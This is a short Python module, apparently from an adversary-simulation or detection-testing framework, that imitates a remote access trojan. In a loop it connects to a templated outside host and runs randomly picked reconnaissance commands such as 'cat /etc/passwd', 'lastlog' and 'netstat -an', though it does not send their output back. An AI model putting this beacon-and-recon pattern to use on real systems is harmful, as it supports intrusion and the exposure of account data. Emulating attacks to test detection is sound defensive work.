try:
    from framework.main import ModuleBase
except ImportError:
    pass

class ReverseShell(ModuleBase):
    COMMANDS = ['id', 'cat /etc/passwd', 'w', 'lastlog', 'last', 'ifconfig', 'netstat -an', 'ss -an', 'ip addr', 'date',
                'ps -ef --forest', 'ls -lart']

    @property
    def relative_delay(self):
        return 20

    @property
    def absolute_duration(self):
        return 3600

    def do_rat(self, host):
        p = None
        try:
            import socket, random, time
            from subprocess import Popen, PIPE
            while True:
                s = socket.socket()
                s.connect(host)
                cmd = random.choice(self.COMMANDS)
                p = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)
                time.sleep(5)
                stdout, stderr = p.communicate()
                s.close()
                p.wait()
        except Exception as e:
            self.hec_logger(str(e), severity='error')
        if p is not None:
            try:
                p.wait(1)
            except:
                pass
        return

    def run(self):
        self.start()
        host = ('${RAT_DOMAIN}', int('${RAT_PORT}'))
        pid = self.util_childproc(func=self.do_rat, args=(host,))
        self.hec_logger('Kicked off the RAT', remote_host='{0}:{1}'.format(*host), pid=pid)
        self.util_orphanwait(pid, timeout=self.absolute_duration)
        self.finish()
